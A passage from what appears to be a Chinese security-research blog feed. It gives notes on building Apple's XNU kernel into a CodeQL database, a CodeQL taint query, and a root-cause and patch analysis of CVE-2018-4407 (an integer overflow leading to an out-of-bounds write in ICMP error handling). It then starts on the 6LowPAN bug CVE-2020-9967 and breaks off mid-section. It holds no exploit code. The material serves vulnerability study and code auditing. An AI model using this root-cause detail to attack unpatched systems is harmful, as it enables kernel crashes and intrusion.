<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://modexp.wordpress.com/2017/01/21/shellcode-osx/">shellcode-osx</a></p>
]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>macOS</tag>
        <tag>exploit</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL + XNU From 0 to 1</title>
    <url>/2021/02/15/CodeQL-XNU-From-0-to-1/</url>
    <content><![CDATA[<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p><strong>本文属于学习过程中的笔记，基本上是把现有的相关资料整合到一起，阅读已有博客/文章并复现，加入一些自己的想法后记录下来的产物。</strong></p>
<p>build XNU 过程来自某大佬的博客，<code>build xnu with codeql</code>过程来自<code>github</code></p>
<span id="more"></span>



<hr>
<p><strong>UPDATE</strong> </p>
<p>2021.3.7 更新，我在big sur上build <code>xnu-7195.81.3</code> 也是遇到了python权限的问题，使用virtualenv的方式解决了。</p>
<hr>
<ul>
<li>如果是老版本，建议先搜一下有没有现成的database可以用。</li>
<li>如果找不到，对于版本跨度比较大的情况，还是虚拟机+老版本Xcode比较稳。</li>
</ul>
<p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p>
<p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/aliyuncs.com/img/codeql_xnu/codeql-xnu_xnu.md">D4rkD0g/boringforever</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudeps</span><br><span class="line">make -f Makefile.xnudeps</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">XNU is now ready to build!</span><br><span class="line"></span><br><span class="line">To build the kernel <span class="keyword">for</span> supported x86_64 machines:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">&quot;RELEASE X86_64 NONE&quot;</span></span><br><span class="line"></span><br><span class="line">To build <span class="keyword">for</span> supported arm64e machines you can, e.g.:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx KDKROOT=/path/to/KDK TARGET_CONFIGS=<span class="string">&quot;RELEASE ARM64 T8101&quot;</span></span><br><span class="line"></span><br><span class="line">For a table of supported arm64 products, visit:</span><br><span class="line">https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html<span class="comment">#xnu-arm64e</span></span><br><span class="line"></span><br><span class="line">See xnu<span class="string">&#x27;s top-level README file for additional build and configuration variables</span></span><br><span class="line"><span class="string">which can be passed on the command line, e.g.,</span></span><br><span class="line"><span class="string">  Speed up the build with: BUILD_LTO=0</span></span><br><span class="line"><span class="string">  Build the development kernel with: KERNEL_CONFIGS=DEVELOPMENT</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use LOGCOLORS=y to colorize the output</span></span><br><span class="line"><span class="string">Use CONCISE=y to keep all the build output on a single line</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">// 正常编译xnu的命令</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">&quot;RELEASE X86_64 NONE&quot;</span></span><br><span class="line">// 使用codeql编译命令</span><br><span class="line">codeql database create xnu-database --language=cpp --<span class="built_in">command</span>=<span class="string">&quot;make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE&quot;</span></span><br></pre></td></tr></table></figure>

<p>剩下的就是等了:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled.png"></p>
<p>随后可以导入数据库到vscode中使用，也可以使用codecli</p>
<ul>
<li>遇到的问题1 ： <code>env: python : Permisson denied</code></li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%201.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%201.png"></p>
<p>解决：可以尝试更换xcode版本来尝试，我也试过使用root或者使用python virtualenv来规避问题，但是还是不行。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%202.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%202.png"></p>
<p>Query测试</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%203.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%203.png"></p>
<h2 id="Case-study"><a href="#Case-study" class="headerlink" title="Case study"></a>Case study</h2><h3 id="CVE-2018-4407-ping-ping-ping"><a href="#CVE-2018-4407-ping-ping-ping" class="headerlink" title="CVE-2018-4407 - ping ping ping"></a>CVE-2018-4407 - ping ping ping</h3><h4 id="Setup-env"><a href="#Setup-env" class="headerlink" title="Setup env"></a>Setup env</h4><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%204.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%204.png"></p>
<p>以10.13.6为例</p>
<p>需要低版本的xcode来编译，直接去 <a href="https://developer.apple.com/download/more/"><code>https://developer.apple.com/download/more/</code></a> 下载即可。</p>
<p>构建 <code>codeql xnu database</code> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 老版本 xcode</span><br><span class="line"></span><br><span class="line">make -f Makefile.xnudeps macos_version=10.13.6  xnudeps</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="find-by-codeql"><a href="#find-by-codeql" class="headerlink" title="find by codeql"></a>find by codeql</h4><p>导入 <code>xnu 10.13.6</code> 的database后，先看原作者的query，尝试理解他的思路</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name mbuf copydata with tainted size</span></span><br><span class="line"><span class="comment"> * @description Calling m_copydata with an untrusted size argument</span></span><br><span class="line"><span class="comment"> *              could cause a buffer overflow.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @id apple-xnu/cpp/mbuf-copydata-with-tainted-size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  Config() &#123; <span class="keyword">this</span> = <span class="string">&quot;tcphdr_flow&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr().(FunctionCall).getTarget().getName() = <span class="string">&quot;m_mtod&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall call</span><br><span class="line">    | call.getArgument(<span class="number">2</span>) = sink.asExpr() <span class="keyword">and</span></span><br><span class="line">      call.getTarget().getName().matches(<span class="string">&quot;%copydata&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">&quot;m_copydata with tainted size.&quot;</span></span><br></pre></td></tr></table></figure>

<p>原作者使用了污点分析来追踪m_mtod调用到 copydata 长度参数。</p>
<p>说下具体的source sink的描述把：</p>
<p>source ： 数据流起点，是一个 函数调用(functioncall)，并且该函数是 <code>m_mtod</code></p>
<p>sink : “终点”（可以这么理解吧），是 <code>copydata</code> 函数的第三个参数，函数名匹配使用了正则，能匹配到 <code>copydata</code> 系列。</p>
<p>结果如下：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%205.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%205.png"></p>
<p>我认为难点并不是如何写污点分析的query，难点应该是 分析就结果然后<strong>构造poc</strong></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从表象来看漏洞出在 <code>m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip);</code></p>
<p><a href="https://sourcegraph.com/github.com/apple/darwin-xnu@0a798f6738bc1db01281fc08ae024145e84df927/-/blob/bsd/netinet/ip_icmp.c#L339">ip_icmp.c - apple/darwin-xnu - Sourcegraph</a></p>
<p>看起来是一个copy数据的时候没有对边界进行检查的“简单的“漏洞，但是Ian beer给作者邮件解释了root casue，这个漏洞发生的本质原因并不是这个地方。</p>
<p>首先看出现漏洞的函数信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Generate an error packet of <span class="built_in">type</span> error</span><br><span class="line"> * <span class="keyword">in</span> response to bad packet ip.</span><br><span class="line"> */</span><br><span class="line">void</span><br><span class="line">icmp_error(</span><br><span class="line">    struct mbuf *n,</span><br><span class="line">    int <span class="built_in">type</span>,</span><br><span class="line">    int code,</span><br><span class="line">    u_int32_t dest,</span><br><span class="line">    u_int32_t nextmtu)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是处理“有问题的IP包”的，返回一个“error packet”给发送者，相当于：发现发过来的IP包有问题之后，生成一个错误信息返回给发送者。</p>
<p>上面的copy函数是复制原本IP包包头的信息复制到返回包中，出现了问题。根据Ian beer的解释：</p>
<p>漏洞实际发生在更早的地方：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icp-&gt;icmp_type = <span class="built_in">type</span>;</span><br></pre></td></tr></table></figure>

<p>那么就要把这个函数从头开始分析一下了，我们重点关注：有问题的数据包在哪里进来的，在哪里被处理的，最终怎么走到copy的逻辑的。</p>
<p>源头： <code>struct mbuf *n</code>   表示有问题的数据包（incoming packet)，下面贴一下 <code>mbuf</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The mbuf object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_hdr</span> <span class="title">m_hdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pkthdr</span> <span class="title">MH_pkthdr</span>;</span>    <span class="comment">/* M_PKTHDR set */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">m_ext</span> <span class="title">MH_ext</span>;</span>    <span class="comment">/* M_EXT set */</span></span><br><span class="line">                <span class="keyword">char</span>    MH_databuf[_MHLEN];</span><br><span class="line">            &#125; MH_dat;</span><br><span class="line">        &#125; MH;</span><br><span class="line">        <span class="keyword">char</span>    M_databuf[_MLEN];        <span class="comment">/* !M_PKTHDR, !M_EXT */</span></span><br><span class="line">    &#125; M_dat;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>返回的数据包： <code>struct mbuf *m</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (MHLEN &gt; (<span class="keyword">sizeof</span>(struct ip) + ICMP_MINLEN + icmplen))</span><br><span class="line">        m = m_gethdr(M_DONTWAIT, MT_HEADER);    <span class="comment">/* MAC-OK */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR);</span><br></pre></td></tr></table></figure>

<p>m的分配和 <code>icmplen</code>  相关：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nlen = m_length(n);</span><br><span class="line">...</span><br><span class="line">icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len));</span><br></pre></td></tr></table></figure>

<p>处理： <code>m-&gt;m_len = icmplen + ICMP_MINLEN;</code></p>
<p>这里看起来还没有问题，计算返回包m的长度；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MH_ALIGN(m, m-&gt;m_len); <span class="comment">// 宏</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 展开之后：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * As above, for mbufs allocated with m_gethdr/MGETHDR</span></span><br><span class="line"><span class="comment"> * or initialized by M_COPY_PKTHDR.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MH_ALIGN(m, len)                        \</span></span><br><span class="line"><span class="meta">do &#123;                                    \</span></span><br><span class="line"><span class="meta">    (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (sizeof (long) - 1);        \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>这个宏并没有检查 MHLEN 和 len 的大小关系，这里是有整数溢出的。</p>
<p>在这个场景里， <code>MHLEN</code> 是 88， len是 m→m_len，也就是 <code>icmplen + ICMP_MINLEN;</code> ，如果可以控制 <code>icmplen</code> 大于80，这里就可以触发整数溢出， m_data 指向了其他位置。</p>
<p>随后使用到这个 <code>已经整数溢出</code> 的长度的地方，并不是copy的逻辑，而是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">icp = mtod(m, struct icmp *);</span><br><span class="line">icp-&gt;icmp_type = type; <span class="comment">// oob write here</span></span><br></pre></td></tr></table></figure>

<p><code>mtod</code> 只是返回了 <code>mbuf</code> 的 data 指针</p>
<p>宏一步一步展开之后：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    mtod(m, t)    ((t)m_mtod(m))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">m_mtod</span><span class="params">(struct mbuf *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (MTOD(m, <span class="keyword">void</span> *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macro version of mtod.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MTOD(m, t)    ((t)((m)-&gt;m_data))</span></span><br></pre></td></tr></table></figure>

<p>在上面的过程之后，icp指针本来是指向 <code>m_buf</code>的数据部分</p>
<p>但是整数溢出之后，<code>m→m_data</code> 增加了一个很大的值(&lt;4GB)，最终在</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">icp-&gt;</span><br><span class="line">icmp_type = type; </span><br></pre></td></tr></table></figure>

<p>就发生了越解写，<code>root case</code> 分析完毕。</p>
<h4 id="about-PATCH"><a href="#about-PATCH" class="headerlink" title="about PATCH"></a>about PATCH</h4><p>先说个人理解，直接对 incoming packet的 icmplen 做检查，使得这个长度必须是在合法范围内（根据包结构来计算）</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%206.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%206.png"></p>
<ul>
<li>长度必须 大于等于 <code>sizeof(struct ip) + ICMP_MINLEN</code></li>
<li>长度必须 大于等于 <code>oiphlen+ICMP_MINLEN</code></li>
</ul>
<p>后面要计算 返回包长度的时候:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%207.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%207.png"></p>
<p>所以这里取到的一定是一个合法的值。</p>
<p>再看后续根据长度，拷贝数据的逻辑：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%208.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%208.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">icmplen = min(icmplen, M_TRAILINGSPACE(m) -</span><br><span class="line">        <span class="keyword">sizeof</span>(struct ip) - ICMP_MINLEN);</span><br></pre></td></tr></table></figure>

<p>这个长度是经过计算的，把为m data部分分配的空间大小考虑了进去，这样保证拷贝数据的长度是合法的。</p>
<p>至此这个洞算是修的没问题了。</p>
<h3 id="Apple-macOS-6LowPAN-Vulnerability"><a href="#Apple-macOS-6LowPAN-Vulnerability" class="headerlink" title="Apple macOS 6LowPAN Vulnerability"></a>Apple macOS 6LowPAN Vulnerability</h3><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p>
<h4 id="Setup-env-1"><a href="#Setup-env-1" class="headerlink" title="Setup env"></a>Setup env</h4><p>有漏洞的版本 <code>10.15.4</code> 为目标，苹果也在Big Sur里做了修复，这些洞影响范围还是比较大的，为了方便起见使用 <code>10.15.4</code> 。 (≤ 10.15.4)</p>
<p><a href="https://kernelshaman.blogspot.com/2020/09/building-xnu-for-macos-catalina-1015x.html">Building XNU for macOS Catalina 10.15.x</a></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%209.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%209.png"></p>
<p>随后测试一下数据库可用即可。</p>
<h4 id="aliyuncs-com-img-codeql-xnu-codeql-xnu-query"><a href="#aliyuncs-com-img-codeql-xnu-codeql-xnu-query" class="headerlink" title="aliyuncs.com/img/codeql_xnu/codeql-xnu query"></a>aliyuncs.com/img/codeql_xnu/codeql-xnu query</h4><p>在这个版本的xnu代码(6153.101.6)，bcopy在xnu中被大量使用，但是实现换成了 <code>builtin___memmove_chk</code> ，所以只需要把 之前污点追踪的 query的sink替换一下即可。</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2010.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2010.png"></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2011.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2011.png"></p>
<p>能覆盖到这些问题，但是需要挨个结果审计，然后构造poc才行。</p>
<h4 id="About-6LowPAN"><a href="#About-6LowPAN" class="headerlink" title="About 6LowPAN"></a>About <code>6LowPAN</code></h4><p><code>6LowPAN</code> 在 macOS10.15引入，全称是: <code>IPv6 over Low-Power Wireless Persona Area Networks</code> </p>
<p>6LoWPAN是一种基于IPv6的低速无线个域网标准，即IPv6 over IEEE 802.15.4。让每个节点可以用IPv6地址联网。这允许节点使用开放标准直接与Internet连接。即使在最小的资源受限设备上也可以应用Internet协议，并且处理能力有限的低功率设备应该能够参与物联网。</p>
<p><a href="https://zhuanlan.zhihu.com/p/152457583">广域无线物联网及6LoWPAN介绍</a></p>
<p><a href="https://tools.ietf.org/html/rfc4919">RFC 4919 - IPv6 over Low-Power Wireless Personal Area Networks (6LoWPANs): Overview, Assumptions, Problem Statement, and Goals</a></p>
<p>（瞎猜一下，感觉这个东西是对应10.15里引入的那个 “以<em>查找</em>未联网Mac 的功能“ ）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frame802154.c → 802.15.4帧创建和解析逻辑</span><br><span class="line"></span><br><span class="line">if_6lowpan.c → 6LowPAN network interface</span><br><span class="line"></span><br><span class="line">sixlowpan.c → 6LowPAN 压缩/解压逻辑</span><br></pre></td></tr></table></figure>

<ul>
<li>IEEE 802.15.4帧格式</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2012.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2012.png"></p>
<p>frame control 字段：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2013.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2013.png"></p>
<p>IPv6报文必须承载在数据帧上。解析帧的时候，首先确定header，随后解析 payload部分。</p>
<ul>
<li>LoWPAN Payload</li>
</ul>
<p>由于全IPv6报文不符合ieee802.15.4帧的要求，IPv6需要提供适配层来满足MTU的最小要求。该标准还定义了报头压缩的使用，因为预计大多数应用程序将使用IEEE 802.15.4上的IP。</p>
<p>LoWPAN payload (e.g., an IPv6 packet) 遵循上面的描述；IPv6 头有40字节。</p>
<p>在初始标准中，定义了 <code>LoWPAN_HC1</code> 压缩IPv6数据报。这意味着6LowPAN的payload 在接收时被压缩。</p>
<ul>
<li>Data Link Layer Dispatching 数据链路层分发</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2014.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2014.png"></p>
<p>首先，我们可以发送一个以太网数据包，该数据包将由demux函数处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ether_demux</span><span class="params">(<span class="keyword">ifnet_t</span> ifp, <span class="keyword">mbuf_t</span> m, <span class="keyword">char</span> *frame_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">protocol_family_t</span> *protocol_family)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_header</span> *<span class="title">eh</span> =</span> (struct ether_header *)(<span class="keyword">void</span> *)frame_header;</span><br><span class="line">    u_short  ether_type = eh-&gt;ether_type;</span><br><span class="line">    <span class="keyword">u_int16_t</span> type;</span><br><span class="line">    <span class="keyword">u_int8_t</span> *data;</span><br><span class="line">    <span class="keyword">u_int32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_desc_blk_str</span> *<span class="title">desc_blk</span> =</span></span><br><span class="line">        (struct ether_desc_blk_str *)ifp-&gt;if_family_cookie;</span><br><span class="line">    <span class="keyword">u_int32_t</span> maxd = desc_blk ? desc_blk-&gt;n_max_used : <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">en_desc</span>  *<span class="title">ed</span> =</span> desc_blk ? desc_blk-&gt;block_ptr : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Check for broadcast */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(etherbroadcastaddr, eh-&gt;ether_dhost) == <span class="number">0</span>) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_BCAST;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m-&gt;m_flags |= M_MCAST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m-&gt;m_flags &amp; M_HASFCS) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If the M_HASFCS is set by the driver we want to make sure</span></span><br><span class="line"><span class="comment">         * that we strip off the trailing FCS data before handing it</span></span><br><span class="line"><span class="comment">         * up the stack.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        m_adj(m, -ETHER_CRC_LEN);</span><br><span class="line">        m-&gt;m_flags &amp;= ~M_HASFCS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * When the driver is put into promiscuous mode we may receive</span></span><br><span class="line"><span class="comment">         * unicast frames that are not intended for our interfaces.</span></span><br><span class="line"><span class="comment">         * They are marked here as being promiscuous so the caller may</span></span><br><span class="line"><span class="comment">         * dispose of them after passing the packets to any interface</span></span><br><span class="line"><span class="comment">         * filters.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(eh-&gt;ether_dhost, IF_LLADDR(ifp))) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_PROMISC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for IEEE 802.15.4 */</span></span><br><span class="line">    <span class="keyword">if</span> (ether_type == htons(ETHERTYPE_IEEE802154)) &#123;</span><br><span class="line">        *protocol_family = PF_802154;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果以太报头中的 <code>ether_type</code> 是 <code>ETHERTYPE_IEEE802154</code> , 那么该函数会将协议族设置为PF 802154。</p>
<p>现在，在默认配置中，这个协议族将不会被处理，除非配置了6lowpan接口，这将导致以下代码注册一个函数 <code>sixlowpan_input</code> ，当处理一个802.15.4帧时将被调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function: sixlowpan_attach_protocol</span></span><br><span class="line"><span class="comment"> * Purpose:</span></span><br><span class="line"><span class="comment"> *   Attach a DLIL protocol to the interface</span></span><br><span class="line"><span class="comment"> *     The ethernet demux actually special cases 802.15.4.</span></span><br><span class="line"><span class="comment"> *     The demux here isn&#x27;t used. The demux will return PF_802154 for the</span></span><br><span class="line"><span class="comment"> *     appropriate packets and our sixlowpan_input function will be called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sixlowpan_attach_protocol</span><span class="params">(struct ifnet *ifp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>     error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifnet_attach_proto_param</span> <span class="title">reg</span>;</span></span><br><span class="line"></span><br><span class="line">    bzero(&amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.input            = sixlowpan_input;</span><br><span class="line">    reg.detached         = sixlowpan_detached;</span><br><span class="line">    error = ifnet_attach_protocol(ifp, PF_802154, &amp;reg);</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s(%s%d) ifnet_attach_protocol failed, %d\n&quot;</span>,</span><br><span class="line">            __func__, ifnet_name(ifp), ifnet_unit(ifp), error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h4><p>调用sixlowpan_input函数来解封装802.15.4数据帧</p>
